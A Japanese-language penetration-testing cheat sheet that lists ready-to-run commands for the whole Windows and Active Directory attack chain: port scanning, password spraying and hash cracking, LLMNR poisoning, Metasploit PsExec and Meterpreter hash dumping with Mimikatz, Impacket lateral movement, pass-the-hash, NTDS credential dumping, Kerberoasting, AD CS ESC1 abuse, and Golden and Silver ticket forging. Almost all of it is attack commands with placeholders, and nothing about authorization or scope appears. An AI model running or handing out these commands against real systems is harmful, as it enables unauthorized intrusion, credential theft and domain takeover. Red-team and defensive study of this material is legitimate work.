**1. スキャンと偵察 (Reconnaissance & Scanning)**

- **高速なポートディスカバリ (Masscan)**: 大規模ネットワークのTCPポートを超高速でスキャンします。帯域幅を圧迫しないよう`--rate`で速度制限を行います。
    - `masscan -p 0-65535 --rate 15000 -oB output.bin <Target_IP/CIDR>`
    - バイナリ形式からGrep可能形式への変換: `masscan --readscan output.bin -oG output.gnmap`
- **詳細なポートスキャン (Nmap)**: Masscanで発見したポートに対し、バージョンやOSを特定します。
    - OSとバージョンの特定: `nmap -sV -O <Target_IP>`
    - 全ポートと詳細スキャン (`-A`は`-O + -sV + -sC + --traceroute`と同等): `nmap -A -p 0-65535 <Target_IP>`
    - ホストディスカバリ（Pingを無効化してポートスキャン）: `nmap -Pn <Target_IP>`
- **Nmap Scripting Engine (NSE)の活用**:
    - SMBのOS特定: `nmap -p 445 --script smb-os-discovery.nse <Target_IP>`
    - HTTPメソッドやヘッダの確認: `nmap -p 80,443 --script http-headers,http-methods <Target_IP>`
- **DNSを利用した高速な内部ネットワーク発見**:
    - `nmap -sL --dns-servers <DNS_IP> <Target_CIDR>`

**2. 初期アクセスとパスワード攻撃 (Initial Access & Password Attacks)**

- **パスワードスプレー (Hydra)**: SMBなどのプロトコルに対してパスワードを試行します。
    - ドメイン指定でのSMBスプレー: `hydra -L users.txt -p Password -m workgroup:{DOMAIN} <Target_IP> smb2`
    - SSHに対する攻撃: `hydra -l root -P passwords.txt ssh://<Target_IP>:<Port>`
- **Microsoft 365 / OWAのパスワードスプレー (TrevorSpray)**:
    - `trevorspray -m owa --url <URL> -u users.txt -p Password1`
- **オフラインパスワードクラック (Hashcat)**:
    - 基本構文: `hashcat -m <ハッシュモード> -a <攻撃モード> <ハッシュファイル> <辞書ファイル>`
    - **主要なハッシュモード (-m)**: `1000` (NTLM), `5600` (NTLMv2), `3000` (LM), `1800` (SHA512crypt)
    - **ルールベース攻撃**: 辞書単語を加工して試行する（例: `best66.rule`の使用）: `hashcat -w 3 -a 0 -m 1000 hashes.txt rockyou.txt -r rules/best66.rule`
- **LLMNR/NBT-NSポイズニング (Responder)**: NTLMv2ハッシュを傍受します。
    - `sudo Responder.py -I eth0`

**3. エクスプロイトとポストエクスプロイト (Metasploit & Meterpreter)**

- **Metasploitの起動とモジュール実行**:
    - `msfconsole`
    - PsExecによるSMB越しのコード実行: `use exploit/windows/smb/psexec`
    - 必須オプションの設定: `set RHOSTS <IP>`, `set SMBUser <User>`, `set SMBPass <Password>`
    - ペイロードの実行: `run` または `exploit`
- **Meterpreterコマンド**:
    - 基本情報: `sysinfo`, `getuid`, `getpid`
    - プロセス移行（安定化や権限借用）: `migrate <プロセスIDまたは名前>`
    - ハッシュのダンプ（SYSTEM権限が必要）: `run post/windows/gather/smart_hashdump` または `run post/windows/gather/hashdump`
    - メモリからの平文パスワードやハッシュ抽出 (Mimikatz): `load kiwi` 実行後に `creds_all`
    - トラフィック転送（ピボット）: `portfwd add -l <ローカルポート> -p <リモートポート> -r <リモートIP>`
    - Windowsのコマンドプロンプトを呼び出す: `shell`

**4. 状況認識とローカル特権昇格 (Situational Awareness & PrivEsc)**

- **Seatbelt (Windows状況認識)**: C#ベースでホストのセキュリティ構成を列挙します。
    - 全てのチェックを実行: `seatbelt.exe -group=all`
    - 特定のチェック（例: アンチウイルス）: `seatbelt.exe AntiVirus`
- **SharpUp (Windows特権昇格チェック)**: PowerUpのC#版で、設定ミスを探します。
    - すべての脆弱性チェックを実行: `sharpup.exe audit`

**5. Active Directoryとラテラルムーブメント (Impacketツール群)** Impacketは、ターゲットの `domain/user:password@target_IP` またはハッシュを用いた認証でWindowsプロトコルを悪用します。

- **情報列挙とKerberoasting**:
    - ドメインSIDとユーザーの列挙: `lookupsid.py domain/user:password@<Target_IP>`
    - Kerberoast攻撃（SPNアカウントのチケット要求）: `GetUserSPNs.py domain/user:password@<DC_IP> -request -dc-ip <DC_IP>`
- **ラテラルムーブメント（リモートコード実行）**:
    - WMI経由の半インタラクティブシェル（痕跡が少ない）: `wmiexec.py domain/user:password@<Target_IP> <command>`
    - サービス作成を伴う実行（SYSTEM権限）: `smbexec.py domain/user:password@<Target_IP>`
- **Pass-the-Hash (PtH)**:
    - パスワードの代わりにNTLMハッシュを使用する: `psexec.py -hashes <LMハッシュ>:<NTハッシュ> domain/user@<Target_IP> cmd.exe`
- **クレデンシャルの抽出**:
    - NTDS.ditやSAMからのハッシュダンプ: `secretsdump.py domain/user:password@<Target_IP> -just-dc-user <username>`

**6. ドメイン支配とチケット攻撃 (Domain Dominance & Ticket Attacks)**

- **AD CS攻撃 (ESC1 - 任意のSAN指定によるなりすまし)**:
    - 脆弱なテンプレートの発見: `certipy find -u user@domain -dc-ip <DC_IP>`
    - 証明書の要求: `certipy req -username <User> -password <Pass> -ca <CAName> -template <Template>`
    - 証明書からNTハッシュを抽出 (PKINIT): `certipy auth -pfx <File.pfx> -dc-ip <DC_IP>`
- **Golden Ticket (ドメイン完全支配)**: `krbtgt`アカウントのAESキーまたはNTハッシュを使用します。
    - Impacketを使用: `ticketer.py -domain-sid <Domain_SID> -domain <Domain> -nthash <krbtgt_hash> <Target_User>`
    - 作成されたチケット(ccache)の利用: `export KRB5CCNAME=Administrator.ccache` の後に `wmiexec.py -k -no-pass -dc-ip <DC_IP> <Target_FQDN> cmd.exe`
- **Silver Ticket (特定サービスの偽造)**: サービスアカウントのハッシュを使用します。
    - Rubeusを使用: `Rubeus.exe silver /service:cifs/<Target_FQDN> /aes256:<Service_Hash> /sid:<Domain_SID> /ptt /user:<User>`